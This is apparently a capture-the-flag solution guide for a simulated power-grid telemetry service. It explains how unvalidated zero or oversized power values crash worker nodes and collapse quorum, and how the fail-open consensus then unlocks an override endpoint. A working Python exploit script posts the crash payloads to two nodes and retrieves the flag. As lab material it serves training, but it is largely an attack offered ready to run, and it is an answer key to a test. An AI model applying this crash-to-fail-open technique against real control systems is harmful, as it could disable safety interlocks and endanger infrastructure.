# A10 Medium Solution Guide: Multi-Node Quorum Collapse via Mathematical Exceptions

### Root Cause
1. **Unhandled Mathematical Domain Exceptions:** The telemetry ingestion pipeline accepts valid floating-point numbers but fails to defensively validate the mathematical domain in Stage 2 before evaluating:
   `math.sqrt((voltage_kv ** 2) - (reactive_power_mvar * 25.0)) / active_power_mw`
   - Setting `active_power_mw = 0` causes `ZeroDivisionError: float division by zero`.
   - Setting `reactive_power_mvar` large enough so that `25 * Q > V^2` causes `ValueError: math domain error`.
2. **Watchdog Quarantine:** When an unhandled exception crashes a node's worker thread, that node enters a `FAULT` state for 20 seconds.
3. **Flawed Fail-Open Consensus:** A minimum of 2 healthy nodes is required for quorum. If 2 nodes are faulted simultaneously, quorum collapses. The consensus engine handles this exceptional state by disengaging all interlocks (fail-open) to prevent blackout, unlocking `/core/override`.

---

### Python Exploit Script

```python
import json
import re
import requests

BASE_URL = "http://127.0.0.1:6029"
TELEMETRY_ENDPOINT = f"{BASE_URL}/api/v1/telemetry/submit"
OVERRIDE_ENDPOINT = f"{BASE_URL}/api/v1/core/override"

# Craft a valid numeric payload that triggers ZeroDivisionError in Stage 2 physics
crash_payload_alpha = {
    "node": "alpha",
    "voltage_kv": 500.0,
    "current_a": 1200.0,
    "active_power_mw": 0.0,  # Causes float division by zero!
    "reactive_power_mvar": 10.0
}

crash_payload_beta = {
    "node": "beta",
    "voltage_kv": 230.0,
    "current_a": 800.0,
    "active_power_mw": 0.0,  # Causes float division by zero!
    "reactive_power_mvar": 10.0
}

print("[*] Dispatching mathematical exception payload to Node-Alpha...")
r1 = requests.post(TELEMETRY_ENDPOINT, json=crash_payload_alpha)
print(f" [+] Node-Alpha Status: {r1.status_code} -> {r1.json().get('error')}")

print("[*] Dispatching mathematical exception payload to Node-Beta within 20s window...")
r2 = requests.post(TELEMETRY_ENDPOINT, json=crash_payload_beta)
print(f" [+] Node-Beta Status: {r2.status_code} -> {r2.json().get('error')}")

print("[*] Querying Emergency Core during Quorum Collapse...")
override_resp = requests.get(OVERRIDE_ENDPOINT, headers={"Accept": "application/json"})
print(f" [+] Response ({override_resp.status_code}): {override_resp.text}")

if override_resp.status_code == 200:
    flag = override_resp.json().get("flag")
    print(f"\n[+] SUCCESS! Captured Dynamic Flag: {flag}")
```
